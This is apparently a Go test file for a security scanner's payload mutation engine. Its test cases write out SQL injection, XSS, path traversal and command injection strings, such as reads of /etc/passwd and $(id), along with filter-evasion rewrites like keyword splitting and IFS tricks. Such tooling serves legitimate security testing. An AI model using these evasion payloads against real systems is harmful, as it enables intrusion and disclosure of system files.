package payload

import (
	"strings"
	"testing"
)

func TestGenerationsAreLayered(t *testing.T) {
	seeds := []string{"1 AND 1=1"}
	gens := Generations(SQLi, seeds)

	if len(gens) != MaxGeneration+1 {
		t.Fatalf("got %d generations, want %d", len(gens), MaxGeneration+1)
	}
	if len(gens[0]) != 1 || gens[0][0].Value != seeds[0] {
		t.Fatalf("generation 0 = %+v, want the plain seed", gens[0])
	}
	if len(gens[1]) == 0 {
		t.Error("generation 1 is empty: single mutations should exist")
	}
	for _, v := range gens[1] {
		if len(v.Mutators) != 1 {
			t.Errorf("generation 1 variant %q has %d mutators, want 1", v.Value, len(v.Mutators))
		}
		if v.Generation != 1 {
			t.Errorf("variant %q reports generation %d", v.Value, v.Generation)
		}
	}
	for _, v := range gens[2] {
		if len(v.Mutators) != 2 {
			t.Errorf("generation 2 variant %q has %d mutators, want 2", v.Value, len(v.Mutators))
		}
	}
}

func TestGenerationResultsAreUnique(t *testing.T) {
	gens := Generations(SQLi, []string{"1' OR '1'='1", "1 AND 1=1"})

	seen := map[string]bool{}
	for gen, variants := range gens {
		for _, v := range variants {
			if seen[v.Value] {
				t.Errorf("duplicate variant %q (generation %d)", v.Value, gen)
			}
			seen[v.Value] = true
			if v.Generation != gen {
				t.Errorf("variant %q sits in generation %d but claims %d", v.Value, gen, v.Generation)
			}
		}
	}
}

func TestGenerationBudgetIsBounded(t *testing.T) {
	seeds := []string{
		"1' OR '1'='1", "1 AND 1=1", "1) AND (1=1", "1\" AND \"1\"=\"1",
		"1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "1' UNION SELECT 1--",
		"1' AND '1'='2", "extra-one", "extra-two",
	}
	gens := Generations(SQLi, seeds)

	for gen, variants := range gens {
		if gen == 0 {
			continue
		}
		if len(variants) > generationCeiling {
			t.Errorf("generation %d holds %d variants, over the ceiling of %d",
				gen, len(variants), generationCeiling)
		}
	}

	// The rule the budget exists to protect: every *kind* of transformation
	// reaches the wire in the first generation, so that nothing in the catalogue
	// sits unused.
	//
	// The assertion is per family rather than per mutator, for two reasons that
	// are not coverage gaps. Two transformations can produce the same string — the
	// first added owns it and the second is redundant rather than unsent — and a
	// transformation that only applies to one shape (`keyword-split-union` needs a
	// UNION) has nothing to rewrite in a seed list that does not carry it.
	sentFamilies := map[string]bool{}
	for _, v := range gens[1] {
		for _, name := range v.Mutators {
			if m, ok := MutatorByName(name); ok {
				sentFamilies[m.Family] = true
			}
		}
	}
	for _, m := range MutatorsFor(SQLi) {
		if !sentFamilies[m.Family] {
			t.Errorf("no transformation of family %q reaches generation 1", m.Family)
		}
	}
}

// TestTheCatalogueFitsTheCeiling keeps the coverage rule honest from the other
// side: budgetFor can only promise "every transformation once" while the
// catalogue is no larger than the ceiling. Growing past it means some
// transformation stops being sent, and that belongs in a failing test rather than
// in a silent gap on a target.
func TestTheCatalogueFitsTheCeiling(t *testing.T) {
	for _, kind := range []Kind{
		SQLi, XSS, Traversal, Command, SSTI, NoSQL, XXE, Redirect, CRLF,
		HostHeader, Generic,
	} {
		if n := len(MutatorsFor(kind)); n > generationCeiling {
			t.Errorf("kind %s has %d transformations, over the ceiling of %d: some would never be sent",
				kind, n, generationCeiling)
		}
	}
}

// TestMutuallyExclusiveFamiliesDoNotCombine is the property that keeps variants
// meaningful: three different ways of hiding a space cannot be stacked.
func TestMutuallyExclusiveFamiliesDoNotCombine(t *testing.T) {
	gens := Generations(SQLi, []string{"1 AND 1=1"})

	spaceFamily := map[string]bool{
		"space-to-comment": true, "space-to-plus": true, "space-to-tab": true,
		"space-to-newline": true, "space-to-vert-tab": true,
	}
	for _, variants := range gens {
		for _, v := range variants {
			count := 0
			for _, name := range v.Mutators {
				if spaceFamily[name] {
					count++
				}
			}
			if count > 1 {
				t.Errorf("variant %q stacks %d space-hiding mutators: %v", v.Value, count, v.Mutators)
			}
		}
	}
}

func TestMutatorRewrites(t *testing.T) {
	cases := []struct {
		mutator string
		in      string
		want    string
	}{
		{"space-to-comment", "1 AND 1=1", "1/**/AND/**/1=1"},
		{"space-to-plus", "1 AND 1=1", "1+AND+1=1"},
		{"space-to-tab", "1 AND 1=1", "1%09AND%091=1"},
		{"and-or-to-operators", "1 AND 1=1", "1 && 1=1"},
		{"and-or-to-operators", "1 OR 1=1", "1 || 1=1"},
		{"cmd-split-command-name", "; cat /etc/passwd", "; c$@at /etc/passwd"},
		{"cmd-split-command-name", "; id_rsa stays a file name", "; id_rsa stays a file name"},
		{"sql-version-comment", "1' UNION SELECT 1,2-- -", "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -"},
		{"keyword-double-write", "1' UNION SELECT 1,2-- -", "1' UNUNIONION SELSELECTECT 1,2-- -"},
		{"keyword-double-write", "1' AND SLEEP(5)-- -", "1' AANDND SLSLEEPEEP(5)-- -"},
		{"keyword-split-union", "1 UNION SELECT 1", "1 UN/**/ION SELECT 1"},
		{"keyword-split-select", "UNION SELECT 1", "UNION SEL/**/ECT 1"},
		{"terminator-to-hash", "1' OR 1=1-- -", "1' OR 1=1#"},
		{"tautology-to-arithmetic", "1 AND 1=1", "1 AND 2-1=1"},
		{"tautology-to-arithmetic", "1' AND '1'='1", "1' AND 'a'='a"},
		{"tag-case", "<script>alert(1)</script>", "<ScRiPt>alert(1)</ScRiPt>"},
		{"event-case", "<img src=x onerror=alert(1)>", "<img src=x OnErRoR=AlErT(1)>"},
		{"svg-vector", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"},
		{"dots-double-slash", "../../etc/passwd", "....//....//etc/passwd"},
		{"dots-idempotent-dot", "../../etc/passwd", "%2e%2e/%2e%2e/etc/passwd"},
		{"slash-to-backslash", "../../etc/passwd", "..\\..\\etc\\passwd"},
		{"sql-widebyte-quote", "admin' or 1=1-- -", "admin%df%27+or+1%3D1--+-"},
		{"cmd-space-to-ifs", "; cat /etc/passwd", ";$IFScat$IFS/etc/passwd"},
		{"cmd-space-to-ifs-brace", "; sleep 5", ";${IFS}sleep${IFS}5"},
		{"cmd-brace-expansion", "; cat /etc/passwd", ";{cat,/etc/passwd}"},
		{"cmd-brace-expansion", "; sleep 5", ";{sleep,5}"},
		{"cmd-glob-path", "; cat /etc/passwd", "; cat /etc/pass?d"},
		{"cmd-quote-splice", "; sleep 5", "; s''leep 5"},
		{"cmd-separator-to-newline", "; id", "%0aid"},
		{"cmd-separator-to-amp", "; id", "&&id"},
		{"cmd-wrap-backtick", "; id", "`id`"},
		{"cmd-wrap-dollar-paren", "; id", "$(id)"},
	}

	for _, tc := range cases {
		t.Run(tc.mutator, func(t *testing.T) {
			mutator, ok := MutatorByName(tc.mutator)
			if !ok {
				t.Fatalf("mutator %q not found", tc.mutator)
			}
			if got := mutator.Apply(tc.in); got != tc.want {
				t.Errorf("%s(%q)\n got: %q\nwant: %q", tc.mutator, tc.in, got, tc.want)
			}
		})
	}
}

func TestMutatorsAreScopedToTheirKind(t *testing.T) {
	// A JavaScript-only rewrite has no business running on a SQL payload.
	for _, m := range MutatorsFor(SQLi) {
		for _, kind := range m.Kinds {
			if kind == XSS {
				t.Errorf("mutator %q declares XSS but applies to SQLi", m.Name)
			}
		}
	}
	// And the traversal family must not appear for XSS.
	for _, m := range MutatorsFor(XSS) {
		if m.Name == "dots-double-slash" {
			t.Error("a traversal mutator applies to XSS")
		}
	}
}

func TestMutatorsDoNotCorruptQuotedLiterals(t *testing.T) {
	// A quoted section inside a payload must survive a character-level rewrite,
	// or the payload stops meaning what it meant.
	mutator, ok := MutatorByName("urlencode-specials")
	if !ok {
		t.Fatal("urlencode-specials not found")
	}
	in := "1 AND 'abc'='abc'"
	got := mutator.Apply(in)
	if !strings.Contains(got, "abc") {
		t.Errorf("the literal inside quotes was mangled: %q", got)
	}
}

func TestCaseSwapAlternates(t *testing.T) {
	mutator, _ := MutatorByName("case-swap")
	got := mutator.Apply("union select")
	if got == "union select" {
		t.Error("case-swap did nothing")
	}
	if strings.ToLower(got) != "union select" {
		t.Errorf("case-swap changed the meaning: %q", got)
	}
}

func TestGenerationsAreDeterministic(t *testing.T) {
	// Two runs against the same target must produce the same requests in the
	// same order, or a finding cannot be reproduced.
	first := Generations(SQLi, []string{"1 AND 1=1"})
	second := Generations(SQLi, []string{"1 AND 1=1"})

	if Count(first) != Count(second) {
		t.Fatalf("counts differ: %d vs %d", Count(first), Count(second))
	}
	for gen := range first {
		for i := range first[gen] {
			if first[gen][i].Value != second[gen][i].Value {
				t.Fatalf("generation %d variant %d differs: %q vs %q",
					gen, i, first[gen][i].Value, second[gen][i].Value)
			}
		}
	}
}

func TestVariantLabel(t *testing.T) {
	if got := (Variant{Value: "x"}).Label(); got != "base" {
		t.Errorf("Label() = %q, want base", got)
	}
	if got := (Variant{Value: "x", Mutators: []string{"a", "b"}}).Label(); got != "base+a+b" {
		t.Errorf("Label() = %q", got)
	}
}

func TestEmptyInputIsSafe(t *testing.T) {
	if gens := Generations(SQLi, nil); gens != nil {
		t.Error("nil seeds produced generations")
	}
	if gens := Generations(SQLi, []string{}); gens != nil {
		t.Error("empty seeds produced generations")
	}
	if total := Count(nil); total != 0 {
		t.Errorf("Count(nil) = %d", total)
	}
	if best := Best(nil); best != 0 {
		t.Errorf("Best(nil) = %d", best)
	}
}
